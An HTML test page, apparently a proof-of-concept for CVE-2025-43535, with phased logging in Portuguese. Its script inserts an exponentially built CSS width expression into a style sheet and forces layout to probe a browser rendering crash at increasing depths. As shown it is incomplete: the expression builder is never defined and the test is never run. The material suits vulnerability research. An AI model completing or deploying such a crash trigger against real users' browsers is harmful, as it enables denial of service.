<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 — V1 Diagnostic</title>
<style>
body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
#log { background:#111; border:1px solid #2a4a2a; padding:12px;
       height:65vh; overflow-y:auto; font-size:12px; line-height:1.6; }
.ok{color:#00ff88}
.fail{color:#ff4444}
.info{color:#ffcc44}
.phase{color:#44aaff}
.crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>

<h3>CVE-2025-43535 — Variante 1 Diagnóstico Completo</h3>
<div id="log"></div>

<script>
function L(msg){
    console.log(performance.now().toFixed(2), msg);
}

function wait(ms){
    return new Promise(r=>setTimeout(r,ms));
}

async function testDepth(depth){

    L("══════════════════════════════");
    L("TESTANDO DEPTH " + depth);

    /* PHASE 1 — BUILD */
    L("PHASE 1 START — build");
    let expr = buildExponential(depth);
    L("PHASE 1 END — length=" + expr.length);

    await wait(100);

    /* PHASE 2 — INSERT */
    L("PHASE 2 START — style insert");
    let style = document.createElement("style");
    document.head.appendChild(style);
    style.textContent = ".t{width:" + expr + "}";
    L("PHASE 2 END — inserted");

    await wait(100);

    /* PHASE 3 — YIELD */
    L("PHASE 3 — idle yield");
    await wait(100);

    /* PHASE 4 — LAYOUT */
    L("PHASE 4 START — layout");
    let d = document.createElement("div");
    d.className = "t";
    document.body.appendChild(d);
    void d.offsetWidth;
    L("PHASE 4 END — layout ok");

    await wait(100);

    /* PHASE 5 — COMPUTED */
    L("PHASE 5 START — computedStyle");
    let cs = getComputedStyle(d).width;
    L("PHASE 5 END — computed=" + cs);

    await wait(100);

    L("DEPTH " + depth + " COMPLETO");

}
</script>

</body>
</html>
